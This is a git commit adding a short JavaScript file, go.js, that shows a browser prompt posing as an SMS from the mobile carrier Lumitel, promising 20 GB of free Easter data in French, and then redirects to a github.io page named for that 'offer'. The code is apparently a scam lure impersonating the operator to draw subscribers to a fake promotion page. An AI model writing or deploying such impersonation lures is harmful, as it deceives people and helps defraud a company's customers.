dfbd45851e4fa933a6fc16f069d65596c285e9d4
allinfohubs <Blessjh199@gmail.com>
2025-04-17 16:21:39 +0100

    Create go.js

---
+++ go.js
@@ -0,0 +1,5 @@
+var password = 'LUMITEL'
+password=prompt('SMS :Bienvenue cher client, obtenez 20 Go de données de Pâques gratuites maintenant, cliquez sur OK pour l obtenir  ','LUMITEL');
+if (password != 'LUMITEL') {
+location.href='https://allinfohubs.github.io/Lumitel.20Go.Paques.offre';
+}
